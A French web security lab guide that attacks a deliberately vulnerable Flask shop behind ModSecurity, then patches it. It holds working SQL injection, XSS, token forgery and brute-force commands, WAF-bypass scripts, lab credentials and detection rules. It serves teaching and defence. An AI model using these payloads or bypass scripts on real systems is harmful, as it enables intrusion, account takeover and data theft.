# TechMart — Guide de démo sécurité web (Jury)
> Lab pédagogique | Flask + PostgreSQL + ModSecurity CRS WAF
> Toutes les commandes ont été testées et produisent les résultats indiqués.

---

## Architecture du lab

```
Attaquant (Kali)
  │
  ├─ :5000 ──→ techmart_app (Flask direct, SANS WAF)     ← Phase 1
  └─ :8080 ──→ central_waf (Nginx + ModSecurity CRS)    ← Phase 2, 3, 4
                    └─ proxy → techmart_app:5000
                    └─ logs  → Loki :3100 → Grafana :3000
```

| Accès | URL | Usage |
|---|---|---|
| App directe (sans WAF) | http://45.92.110.154:5000 | Phase 1 |
| App via WAF (ModSecurity) | http://45.92.110.154:8080 | Phase 2, 3, 4 |
| Grafana (logs WAF) | http://45.92.110.154:3000 | Monitoring |

**Comptes disponibles :**
```
admin   / Admin@1234   (rôle admin)
alice   / alice123     (rôle user, id=2)
bob     / bob456       (rôle user, id=3)
charlie / charlie789   (rôle user, id=4)
test    / test         (rôle user, id=5)
```

---

## Démarrage du lab

```bash
# Lancer tous les conteneurs
docker-compose up -d --build

# Vérifier que les 6 conteneurs sont UP
docker-compose ps

# Logs WAF en direct (dans un terminal séparé)
docker exec central_waf tail -f /var/log/nginx/modsec_audit.log

# ⚠️ IMPORTANT : le WAF démarre en DetectionOnly par défaut
# Pour la démo, activer le mode blocage AVANT la Phase 2 :
# Dans docker-compose.yml, changer :
#   MODSECURITY_SEC_RULE_ENGINE=DetectionOnly  →  On
docker-compose restart waf
```

> **Note sur le mode DetectionOnly :** malgré ce paramètre, des 403 peuvent
> apparaître. C'est parce que l'image `owasp/modsecurity-crs:nginx-alpine`
> démarre en mode `On` si la variable d'env n'est pas correctement lue.
> Pour forcer DetectionOnly, ajouter aussi `SEC_RULE_ENGINE=DetectionOnly`
> dans docker-compose.yml. Pour la démo, travailler directement en mode `On`.

---

## Cartographie des vulnérabilités (code source confirmé)

### 1. SQL Injection (CRITIQUE) — CWE-89 / OWASP A03

6 points d'injection par concaténation directe dans `app.py` :

```python
# /login
c.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")

# /search?q=
c.execute(f"...WHERE p.name ILIKE '%{q}%' OR p.description ILIKE '%{q}%'")

# /product/<product_id>  ← product_id est une STRING, pas un int
c.execute(f"SELECT ...FROM products...WHERE p.id={product_id}")

# /cart/coupon
c.execute(f"SELECT * FROM coupons WHERE code='{code}' AND active=1")

# /api/v1/auth/login (JSON)
c.execute(f"SELECT * FROM users WHERE username='{username}' AND password='{password}'")

# /api/v1/products/search?q=
c.execute(f"SELECT ...FROM products WHERE name ILIKE '%{q}%'...")
```

### 2. XSS — 3 types (CRITIQUE) — CWE-79 / OWASP A03

```python
# Réfléchi : search.html → {{ query | safe }}  ← rendu HTML brut
# Stocké   : product.html → {{ r.content | safe }}  ← contenu avis sans échappement
# DOM      : category.html → document.getElementById('sort-display').innerHTML = sortParam
#            profile.html  → var curTab = "{{ tab or 'info' }}" puis innerHTML
```

### 3. IDOR (ÉLEVÉ) — CWE-639 / OWASP A01

```python
# /orders/<id> et /api/v1/orders/<id> — commentaire dans le code :
# "IDOR : aucune vérification de propriété"
# Pas de : if order['user_id'] != session['user_id']: abort(403)
```

### 4. Token API falsifiable (ÉLEVÉ) — CWE-347 / OWASP A07

```python
def gen_api_token(user_id, role):
    return base64.b64encode(f"{user_id}:{role}".encode()).decode()
# Résultat : base64("5:user") → simple à décoder ET à forger
```

### 5. CSRF (ÉLEVÉ) — CWE-352 / OWASP A01

Aucun token CSRF sur `/cart/add`, `/checkout`, `/profile`.

### 6. Secrets exposés (MOYEN) — CWE-256 / OWASP A02

- Mots de passe en texte clair en BDD
- Clé Flask statique : `techmart_w3ak_s3cr3t_2024`
- Table `secret_data` : FLAG, DB_PASSWORD, API_KEY, SMTP_PASS

---

## Phase 1 — Exploitation SANS WAF (port 5000)

> Toutes ces commandes sont testées et fonctionnent.

### A — SQLi Login bypass → accès admin

**Dans le navigateur** (effet le plus visuel) :
```
URL   : http://45.92.110.154:5000/login 
Login : admin'--
Mdp   : (n'importe quoi)
```

Requête générée côté serveur :
```sql
SELECT * FROM users WHERE username='admin'--' AND password='x'
-- Le -- commente tout ce qui suit → authentification bypassée
```

**En ligne de commande :**
# ✅ CORRECT — écriture ET lecture du cookie dans la même commande
```bash
curl -s -c cookies.txt -b cookies.txt \
  -X POST http://45.92.110.154:5000/login \
  -d "username=admin'--&password=x" -L | grep -o "Bonjour\|admin\|Dashboard\|profil\|déconnexion"

# Vérifier que la session est bien établie
curl -s -b cookies.txt http://45.92.110.154:5000/admin | grep -o "Dashboard\|stats-grid\|Accès refusé" | head -1



---


# Détection automatique du SGBD + version
```bash
sqlmap -u "http://45.92.110.154:5000/search?q=test" \
  -p q \
  --banner \
  --batch


**Automatisation avec sqlmap :**
```bash
# Sans WAF — dump ciblé secret_data (5 entrées : FLAG, DB_PASSWORD, API_KEY, ADMIN_JWT, SMTP_PASS)
sqlmap -u "http://45.92.110.154:5000/search?q=test" \
  --dbms=postgresql \
  -p q \
  --prefix="'" \
  --suffix="--" \
  --technique=U \
  --union-cols=13 \
  -T secret_data \
  --dump \
  --batch

rm -rf ~/.local/share/sqlmap/output/45.92.110.154/

# Dump complet (toutes les tables)
sqlmap -u "http://45.92.110.154:8080/search?q=test" \
  --dbms=postgresql \
  -p q \
  --prefix="'" \
  --suffix="--" \
  --technique=U \
  --union-cols=13 \
  --dump-all \
  --batch
```

---

### C — SQLi sur l'ID produit (URL path)

```bash
# Injection confirmée : product_id est une STRING non castée
# Vérification booléenne
curl -s "http://45.92.110.154:5000/product/1 AND 1=2" | grep -o "product-detail\|404"
# → page vide (1=2 → aucun produit)

curl -s "http://45.92.110.154:5000/product/1 AND 1=1" | grep -o "MacBook\|product-name"
# → MacBook (page normale)

# Exfiltration via URL
curl -s "http://45.92.110.154:5000/product/0 UNION SELECT 1,label,value,4,5,6,7,8,9,10,11,12,13 FROM secret_data WHERE id=1 --" \
  | grep -o "FLAG{[^}]*}"
```

---

### D — SQLi Coupon → réduction -50%

```bash
# Activer le coupon ADMIN50 (active=0) en bypassant la condition active=1
curl -s -c coupon_cookies.txt -b coupon_cookies.txt \
  -X POST http://45.92.110.154:5000/login \
  -d "username=alice&password=alice123" -L > /dev/null

curl -s -b coupon_cookies.txt \
  -X POST http://45.92.110.154:5000/cart/coupon \
  --data-urlencode "code=PROMO10' OR '1'='1" \
  -L | grep -o "ADMIN50\|appliqué\|50%\|invalide"
# → appliqué (ADMIN50 -50% activé)
```

---

### E — XSS Réfléchi /search

**Dans le navigateur** :
```bash
http://45.92.110.154:5000/search?q=<script>alert(document.cookie)</script>
http://45.92.110.154:5000/search?q=<img src=x onerror=alert('XSS!')>
```

**curl pour confirmer le rendu sans échappement :**
```bash
curl -s "http://45.92.110.154:5000/search?q=<script>alert(1)</script>" \
  | grep -o "<script>alert(1)</script>"
# → le payload est retourné tel quel dans le HTML
```

---

### F — XSS Stocké /product/1

```bash
# 1. Se connecter en alice
curl -s -c alice_cookies.txt -b alice_cookies.txt \
  -X POST http://45.92.110.154:5000/login \
  -d "username=alice&password=alice123" -L > /dev/null

# 2. Injecter le XSS dans un avis produit
curl -s -b alice_cookies.txt \
  -X POST http://45.92.110.154:5000/product/1/review \
  --data-urlencode "rating=5" \
  --data-urlencode "title=Excellent produit" \
  --data-urlencode "content=<script>alert('XSS Stocké ! Cookie = '+document.cookie)</script>" \
  -L > /dev/null

# 3. Vérifier que le payload est stocké et rendu sans échappement
curl -s http://45.92.110.154:5000/product/1 | grep -o "XSS Stocké\|alert("
# → XSS Stocké (payload présent dans la page)
```

**Effet démo** : tout visiteur de http://45.92.110.154:5000/product/1 voit l'alerte.

---

### G — XSS DOM

```bash
# Injection dans innerHTML côté JS
http://45.92.110.154:5000/category/1?sort=<img src=x onerror=alert(document.cookie)>
http://45.92.110.154:5000/profile?tab=<img src=x onerror=alert('XSS DOM')>
```

---

### H — IDOR /orders
```bash
# ✅ Créer la session test
curl -s -c test_cookies.txt -b test_cookies.txt \
  -X POST http://45.92.110.154:5000/login \
  -d "username=test&password=test" -L > /dev/null

# Vérifier la session
curl -s -b test_cookies.txt http://45.92.110.154:5000/orders | grep -o "Mes commandes\|connectez"

# IDOR — accéder aux commandes d'autres utilisateurs
for i in $(seq 1 10); do
  echo -n "Commande $i : "
  curl -s -b test_cookies.txt "http://45.92.110.154:5000/orders/$i" \
    | grep -o "alice\|bob\|charlie\|admin\|Commande introuvable"
done

# Commande 1 : alice  (3299€ MacBook)
# Commande 3 : charlie
# Commande 4 : alice
```

---

### I — Token API forgé

```bash
# Obtenir un token légitime (test:test)
TOKEN=$(curl -s -X POST http://45.92.110.154:5000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"test"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Décoder → révèle le format trivial
echo $TOKEN | base64 -d
# → 5:user

# Forger un token admin sans connaître aucun secret
ADMIN_TOKEN=$(printf "1:admin" | base64)
echo $ADMIN_TOKEN
# → MTphZG1pbg==

# Accéder aux commandes de n'importe quel utilisateur
curl -s "http://45.92.110.154:5000/api/v1/orders/1" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | python3 -m json.tool

# Voir le portefeuille d'alice (id=2)
ALICE_TOKEN=$(printf "2:user" | base64)
curl -s "http://45.92.110.154:5000/api/v1/wallet/balance" \
  -H "Authorization: Bearer $ALICE_TOKEN"
# → {"balance": 80.0, "currency": "TC", "user_id": 2}
```

---

### J — Brute Force sans WAF (Hydra + rockyou)

```bash
# Wordlist enrichie
cat > wordlist.txt << 'EOF'
wrong1
wrong2
wrong3
test
password
123456
admin
letmein
test123
EOF

# Hydra — "test" apparaît dans les 10 premières lignes de rockyou → trouvé en <5s
hydra -l test -P wordlist.txt \
  -s 8080 45.92.110.154 \
  http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Identifiants incorrects" \
  -t 4 -V -f
# → [5000][http-post-form] host: 45.92.110.154  login: test  password: test
```

# Brute Force avec WAF (port 8080) — doit être bloqué
# bash# Hydra avec User-Agent Mozilla pour passer la règle 1001
```bash
hydra -l test -P wordlist.txt \
  -s 8080 45.92.110.154 \
  http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Identifiants incorrects:H=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -t 1 -V

---

## Phase 2 — Mêmes attaques AVEC WAF (port 8080)


**Afficher les logs WAF en temps réel :**
```bash
docker exec central_waf tail -f /var/log/nginx/modsec_audit.log | python3 -m json.tool
```

**Grafana :** http://45.92.110.154:3000 (admin/admin)
```
Explore → Loki → {job="waf"} |= "403"   # toutes les attaques bloquées
{job="waf"} |= "SQLi"                    # injections SQL
{job="waf"} |= "XSS"                     # cross-site scripting
{job="waf"} |= "Brute"                   # tentatives de brute force
```

---

## Phase 3 — Contournement du WAF (port 8080)

> Ces bypasses sont testés et fonctionnent sur ce lab.

### Bypass 1 — sqlmap avec tamper scripts (CONFIRMÉ ✅)

Le WAF bloque l'UA sqlmap (règle 1001) et les patterns UNION SELECT (1101 + CRS 942xxx).
La combinaison `--random-agent` + tamper scripts contourne les deux :

```bash
# Étape 1 : Identifier l'injection (session sauvegardée automatiquement)
sqlmap -u "http://45.92.110.154:8080/search?q=test" \
  --dbms=postgresql \
  -p q \
  --prefix="'" \
  --suffix="--" \
  --technique=U \
  --union-cols=13 \
  --random-agent \
  --tamper=between,randomcase,space2comment,charencode \
  --level=3 --risk=2 \
  --batch
# → Confirme l'injection UNION à 13 colonnes via CHR() encoding

# Étape 2 : Extraire les tables
sqlmap -u "http://45.92.110.154:8080/search?q=test" \
  --dbms=postgresql \
  -p q \
  --prefix="'" \
  --suffix="--" \
  --technique=U \
  --union-cols=13 \
  --random-agent \
  --tamper=between,randomcase,space2comment,charencode \
  --tables \
  --batch

# Étape 3 : Extraire secret_data (FLAG)
sqlmap -u "http://45.92.110.154:8080/search?q=test" \
  --dbms=postgresql \
  -p q \
  --prefix="'" \
  --suffix="--" \
  --technique=U \
  --union-cols=13 \
  --random-agent \
  --tamper=between,randomcase,space2comment,charencode \
  -T secret_data \
  --dump \
  --batch
# → FLAG{techmart_sqli_union_pwned_2024} même via le WAF

# Étape 4 : Dump complet
sqlmap -u "http://45.92.110.154:8080/search?q=test" \
  --dbms=postgresql \
  -p q \
  --prefix="'" \
  --suffix="--" \
  --technique=U \
  --union-cols=13 \
  --random-agent \
  --tamper=between,randomcase,space2comment,charencode \
  --level=5 --risk=3 \
  --dump-all \
  --batch
```

**Pourquoi ça marche ?** Les 4 tamper scripts transforment le payload en chaîne :
```
Payload brut :    ' UNION SELECT 1,username ...
  randomcase   →  ' uNiOn SeLeCt 1,username ...
  space2comment→  ' uNiOn/**/SeLeCt/**/1,username ...
  between      →  conditions réécrites avec BETWEEN 0 AND
  charencode   →  CHR(49),CHR(50),... à la place des littéraux entiers
```

Résultat : le payload ne contient plus les mots `union`/`select` sous aucune
forme textuelle — ils sont remplacés par des chaînes `CHR(N)||CHR(N)||...`.
`t:removeComments` élimine `/**/` mais **aucune transformation ModSecurity
ne dé-encode `CHR(85)||CHR(78)||CHR(73)||CHR(79)||CHR(78)` en `UNION`**.
Les règles 1101 et CRS 942xxx matchent sur des chaînes de texte — elles
sont donc totalement aveugles à ce payload. La règle 1120 (Fix 3 initial)
échoue pour la même raison.

---

### Bypass 2 — SQLi login `admin'--` non couvert par règle 1101

La règle 1101 cible spécifiquement `UNION...SELECT`. Elle ne couvre pas
le bypass par commentaire simple. Il passe malgré le WAF :

```bash
curl -s -c waf_cookies.txt -b waf_cookies.txt \
  -X POST http://45.92.110.154:8080/login \
  -d "username=admin'--&password=x" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -L | grep -o "Bonjour\|déconnexion\|admin" | head -1
# → déconnexion (connexion admin réussie via le WAF)
```

---

### Bypass 3 — SQLi JSON body (ModSecurity aveugle au JSON)

ModSecurity ne parse pas `application/json` par défaut.
Les règles basées sur `ARGS` sont aveugles au contenu JSON.
La règle 1105 cherche `%27` (apostrophe URL-encodée) — l'apostrophe brute JSON n'est pas encodée :

```bash
# Bypass login admin via API JSON
curl -s -X POST http://45.92.110.154:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -d '{"username":"admin'\''--","password":"x"}'
# → {"token":"MTphZG1pbg==","role":"admin",...}  (succès)
```

---

### Bypass 4 — XSS via événements HTML5 non listés dans la règle 1201

La règle 1201 couvre seulement : `on(error|load|click|mouseover)`.
Des dizaines d'événements sont absents. Dans le navigateur :

```
# ontoggle — non couvert
http://45.92.110.154:8080/search?q=<details open ontoggle=alert(document.cookie)>

# onfocus — non couvert
http://45.92.110.154:8080/search?q=<input onfocus=alert(1) autofocus>

# onpointerover — non couvert
http://45.92.110.154:8080/search?q=<div onpointerover=alert(1)>hover</div>

# onanimationstart — non couvert
http://45.92.110.154:8080/search?q=<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)></div>
```

---

### Bypass 5 — Brute Force : slow brute (sous le seuil de la règle 1502)

La règle 1502 bloque après **15 tentatives en 300 secondes**.
En espaçant les requêtes à 21 secondes, on reste toujours en dessous du seuil :

```python
# slow_brute.py — 1 requête toutes les 21 secondes → jamais bloqué
import requests, time

TARGET  = "http://45.92.110.154:8080"
ROCKYOU = "/usr/share/wordlists/rockyou.txt"
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

print("[*] Slow brute force — sous le seuil WAF (15/300s)\n")

with open(ROCKYOU, "r", encoding="latin-1") as f:
    for i, line in enumerate(f):
        pwd = line.strip()
        if not pwd:
            continue
        r = requests.post(f"{TARGET}/login",
                          data={"username": "test", "password": pwd},
                          headers=HEADERS,
                          allow_redirects=False,
                          timeout=5)
        if r.status_code == 302:
            print(f"\n[+] TROUVÉ : test:{pwd}  (tentative #{i+1})")
            break
        print(f"  [{i+1:>3}] test:{pwd:<20} → HTTP {r.status_code}")
        time.sleep(21)   # 14 tentatives max en 300s → jamais bloqué
```

```bash
python3 slow_brute.py
# "test" est dans les 10 premières lignes de rockyou → trouvé en ~3 min
```

---

### Bypass 6 — Brute Force : rotation X-Forwarded-For (contourne le compteur IP)

Le compteur de la règle 1502 est indexé sur `REMOTE_ADDR`.
Nginx transmet `X-Forwarded-For` à l'app mais ModSecurity continue de compter sur `REMOTE_ADDR`.
Chaque IP forgée a son propre compteur vierge :

```python
# xff_brute.py — rotation d'IP → chaque tentative a compteur = 0
import requests

TARGET  = "http://45.92.110.154:8080"
ROCKYOU = "/usr/share/wordlists/rockyou.txt"
HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

print("[*] Bypass rate limit — X-Forwarded-For rotation\n")

with open(ROCKYOU, "r", encoding="latin-1") as f:
    for i, line in enumerate(f):
        pwd = line.strip()
        if not pwd:
            continue
        xff = f"10.{(i//65025)%256}.{(i//255)%256}.{i%255+1}"
        headers = {**HEADERS, "X-Forwarded-For": xff}
        r = requests.post(f"{TARGET}/login",
                          data={"username": "test", "password": pwd},
                          headers=headers,
                          allow_redirects=False,
                          timeout=5)
        if r.status_code == 302:
            print(f"\n[+] TROUVÉ : test:{pwd}  IP={xff}  (tentative #{i+1})")
            break
        elif r.status_code in (429, 403):
            print(f"  [!] Bloqué #{i+1} pwd={pwd} IP={xff} → rotation auto")
        else:
            print(f"  [{i+1:>3}] IP={xff:<15} test:{pwd:<15} → HTTP {r.status_code}")
```

```bash
python3 xff_brute.py
```

---

### Bypass 7 — Faille règle 1503 : incrémente sans jamais bloquer

La règle 1503 incrémente `ip.test_bruteforce` mais **aucune règle ne lit
ce compteur pour bloquer**. Le compte `test` peut être attaqué indéfiniment
sans déclencher de 429, même sans X-Forwarded-For :

```bash
# Preuve : 30 tentatives directes → aucun blocage
for i in $(seq 1 30); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://45.92.110.154:8080/login \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    -d "username=test&password=wrong$i")
  echo "Tentative $i → HTTP $CODE"
done
# → Toutes HTTP 200 — jamais 429 — la règle 1503 ne bloque rien
```

---

## Phase 4 — Correction des règles WAF

> Modifier `waf/custom-rules.conf`, puis relancer :
> `docker-compose restart waf`

### Fix 1 — Couvrir le login bypass `admin'--`

```apache
# Ajouter après la règle 1101
SecRule ARGS \
  "@rx (?i)('[\s]*--|'[\s]*#|'\s*or\s+[0-9]|'\s*or\s+')" \
  "id:1110,phase:2,deny,status:403,log,msg:'SQLi comment/tautology bypass'"
```

### Fix 2 — Parsing du body JSON (aveugle ModSecurity)

```apache
# Activer le parser JSON en phase 1
SecRule REQUEST_HEADERS:Content-Type "@rx application/json" \
  "id:900010,phase:1,pass,nolog,ctl:requestBodyProcessor=JSON"

# Étendre la détection SQLi au REQUEST_BODY parsé
SecRule ARGS|REQUEST_BODY|REQUEST_URI \
  "@rx (?i)(union[\s\+\/\*\(]+select|'[\s]*--|'\s*or\s+)" \
  "id:1102,phase:2,deny,status:403,log,msg:'SQLi in JSON body'"
```

### Fix 3 — Bloquer les tamper scripts sqlmap (normalisation + CHR encoding)

> **Pourquoi le Fix précédent échouait** : `t:removeComments` supprime `/**/`
> (bypass `space2comment`) et `t:lowercase` contre `randomcase`, mais **aucune
> transformation ModSecurity ne dé-encode `CHR(85)||CHR(78)||...`** (tamper
> `charencode`). Le payload ne contient plus les mots `union`/`select` —
> il les encode en appels de fonction PostgreSQL. Il faut une règle dédiée.

**Règle 1 — Bloquer la normalisation classique (space2comment + randomcase) :**
```apache
SecRule ARGS \
  "@rx (?i)(union|select|from|where|insert|drop)" \
  "id:1120,phase:2,\
  t:lowercase,t:removeComments,t:urlDecodeUni,t:htmlEntityDecode,\
  deny,status:403,log,\
  msg:'SQLi detected after normalization'"
```

**Règle 2 — Bloquer CHR() encoding (tamper charencode) :**
```apache
# CHR(N)||CHR(N) = signature caractéristique de charencode sur PostgreSQL
SecRule ARGS \
  "@rx (?i)CHR\s*\(\s*[0-9]+\s*\)\s*\|\|" \
  "id:1121,phase:2,deny,status:403,log,\
  msg:'SQLi CHR() concat encoding (charencode tamper) detected'"
```

**Règle 3 — Bloquer la concaténation excessive `||` (générique) :**
```apache
# Plus de 3 occurrences de || dans un même paramètre = encodage suspect
SecRule ARGS \
  "@rx (\|\|.*){3}" \
  "id:1122,phase:2,deny,status:403,log,\
  msg:'Excessive SQL concatenation operator detected'"
```

Augmenter aussi le niveau de paranoïa du CRS dans `docker-compose.yml` :
```yaml
- PARANOIA=2
```

> **Note paranoïa 2** : active les règles CRS 942200+ qui détectent les fonctions
> SQL PostgreSQL (`CHR`, `ASCII`, `SUBSTR`, etc.) indépendamment des mots-clés.
> C'est le filet de sécurité si la règle 1121 venait à être contournée.

### Fix 4 — Compléter les événements XSS manquants

```apache
# Remplacer la règle 1201 par :
SecRule ARGS \
  "@rx (?i)(<\s*script[\s>\/]|<\s*iframe[\s>]|javascript\s*:|\
on(error|load|click|mouseover|focus|blur|toggle|resize|input|change|\
keydown|keyup|submit|reset|pointerover|pointerdown|animationstart|\
animationend|transitionend|wheel|drag|drop|copy|paste|begin)\s*=|\
<\s*(details|svg|math|body|form|object|embed|style)\s)" \
  "id:1201,phase:2,deny,status:403,log,msg:'XSS detected (extended)'"
```

### Fix 5 — Corriger le brute force (règle 1503 sans blocage + slow brute)

```apache
# Ajouter la règle de blocage manquante pour le compte test
SecRule IP:test_bruteforce "@gt 5" \
  "id:1504,phase:2,deny,status:429,log,msg:'Brute force on account test'"

# Réduire la fenêtre de 300s à 60s et le seuil de 15 à 5
# Remplacer les règles 1501 et 1502 par :
SecRule REQUEST_URI "@rx ^/(login|api/v1/auth/login)" \
  "id:1501,phase:2,pass,nolog,\
  setvar:ip.login_attempt=+1,\
  expirevar:ip.login_attempt=60"

SecRule IP:login_attempt "@gt 5" \
  "id:1502,phase:2,deny,status:429,log,\
  msg:'Brute force detected — login attempts exceeded'"
```

### Fix 6 — Contrer le bypass X-Forwarded-For

```apache
# Lire X-Forwarded-For comme clé de collection si présent
SecRule REQUEST_HEADERS:X-Forwarded-For \
  "@rx ^([0-9]{1,3}\.){3}[0-9]{1,3}$" \
  "id:900002,phase:1,pass,nolog,\
  setvar:tx.client_ip=%{REQUEST_HEADERS.X-Forwarded-For}"

SecRule &REQUEST_HEADERS:X-Forwarded-For "@eq 0" \
  "id:900003,phase:1,pass,nolog,\
  setvar:tx.client_ip=%{REMOTE_ADDR}"

# Compter sur tx.client_ip plutôt que REMOTE_ADDR
SecRule REQUEST_URI "@rx ^/(login|api/v1/auth/login)" \
  "id:1506,phase:2,pass,nolog,\
  setvar:ip_%{tx.client_ip}.xff_login=+1,\
  expirevar:ip_%{tx.client_ip}.xff_login=60"
```

### Vérification post-fix

```bash
docker-compose restart waf

# Ces commandes doivent toutes retourner 403 :

# Fix 1 — login bypass
curl -s -o /dev/null -w "%{http_code}" \
  -X POST http://45.92.110.154:8080/login \
  -H "User-Agent: Mozilla/5.0" \
  -d "username=admin'--&password=x"
# → 403

# Fix 2 — JSON body
curl -s -o /dev/null -w "%{http_code}" \
  -X POST http://45.92.110.154:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0" \
  -d '{"username":"admin'\''--","password":"x"}'
# → 403

# Fix 3 — sqlmap tamper charencode (CHR encoding)
# Test 1 : payload CHR() direct
curl -s -o /dev/null -w "%{http_code}" \
  "http://45.92.110.154:8080/search?q=test'/**/uNiOn/**/SeLeCt/**/CHR(49),CHR(50)--"
# → 403

# Test 2 : sqlmap avec tous les tampers — doit être bloqué
sqlmap -u "http://45.92.110.154:8080/search?q=test" \
  --random-agent \
  --tamper=between,randomcase,space2comment,charencode \
  -p q --technique=U --union-cols=13 --batch
# → tous les payloads bloqués 403

# Fix 4 — XSS ontoggle
curl -s -o /dev/null -w "%{http_code}" \
  "http://45.92.110.154:8080/search?q=<details+open+ontoggle=alert(1)>"
# → 403

# Fix 5 — 6e tentative de brute force
for i in $(seq 1 8); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://45.92.110.154:8080/login \
    -H "User-Agent: Mozilla/5.0" \
    -d "username=test&password=wrong$i")
  echo "Tentative $i → HTTP $CODE"
done
# → HTTP 200 jusqu'à 5, puis HTTP 429 dès la 6e
```

---

## Corrections applicatives (défense en profondeur)

Le WAF ne suffit pas seul. Les vraies corrections sont dans le code :

```python
# 1. Requêtes paramétrées — éliminer l'injection à la source
c.execute("SELECT * FROM users WHERE username=%s AND password=%s",
          (username, password))

# 2. Hachage des mots de passe
from werkzeug.security import generate_password_hash, check_password_hash
hashed = generate_password_hash(password, method='scrypt')
check_password_hash(hashed, submitted_password)

# 3. Token API signé (JWT)
import jwt, os
SECRET = os.environ.get('JWT_SECRET')  # clé forte depuis l'environnement
token = jwt.encode(
    {"user_id": uid, "role": role, "exp": datetime.utcnow() + timedelta(hours=1)},
    SECRET, algorithm="HS256")
payload = jwt.decode(token, SECRET, algorithms=["HS256"])

# 4. Protection CSRF
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)

# 5. Retirer |safe des templates → auto-escape Jinja2
# search.html  : {{ query | safe }}  →  {{ query }}
# product.html : {{ r.content | safe }}  →  {{ r.content }}

# 6. Correction IDOR
if order['user_id'] != session.get('user_id') and session.get('role') != 'admin':
    abort(403)

# 7. product_id casté en entier
@app.route('/product/<int:product_id>')   # int: → plus de SQLi via URL
def product_detail(product_id): ...
```

---

## Outils utilisés

| Outil | Installation | Usage dans ce lab |
|---|---|---|
| **curl** | natif Kali | Toutes les attaques manuelles |
| **sqlmap** | `apt install sqlmap` | Automatisation SQLi, dump BDD |
| **hydra** | `apt install hydra` | Brute force login (Phase 1) |
| **nikto** | `apt install nikto` | Scan web (démo blocage UA) |
| **python3 + requests** | `pip install requests` | Scripts slow brute, XFF bypass |
| **Firefox DevTools** | natif | Démo XSS visuelle, cookies |
| **Grafana + Loki** | inclus Docker | Logs WAF temps réel (port 3000) |
| **Docker** | `apt install docker.io` | Gestion conteneurs, restart WAF |

**Wordlists utilisées :**
```bash
/usr/share/wordlists/rockyou.txt        # mots de passe (décompresser si .gz)
```

---

## Séquence recommandée (30 min)

```
05 min  Architecture — ports, Grafana ouvert, docker-compose ps
        → Montrer les 6 conteneurs, expliquer le flux WAF

08 min  Phase 1 (port 5000, sans WAF)
        → A : SQLi login admin'-- dans le navigateur → panel admin
        → B : UNION SELECT → FLAG et mots de passe dans la grille
        → F : XSS stocké (injecter puis recharger le produit)
        → H : IDOR bob qui voit les commandes d'alice
        → I : Token base64 forgé → accès admin API

05 min  Phase 2 (port 8080, WAF On)
        → Rejouer A, B, E → 403 à chaque fois
        → Grafana : logs WAF en temps réel
        → Montrer IDOR et Token forgé qui passent toujours

07 min  Phase 3 — Contournement
        → Bypass 2 : login admin'-- passe via le WAF (règle 1101 aveugle)
        → Bypass 3 : JSON body SQLi → token admin obtenu
        → Bypass 1 : sqlmap + tamper → FLAG extrait via le WAF
        → Bypass 4 : ontoggle XSS dans le navigateur
        → Bypass 5/6 : slow_brute.py ou xff_brute.py

05 min  Phase 4 — Correction des règles
        → Éditer custom-rules.conf (Fix 1, 2, 4, 5)
        → docker-compose restart waf
        → Rejouer les bypasses → 403 confirmé

        Message final : "Le WAF corrigé bloque les contournements,
        mais la vraie solution reste la correction du code source —
        montrer les requêtes paramétrées et le retrait de |safe"
```

---
*Usage pédagogique uniquement — Lab de sécurité web*
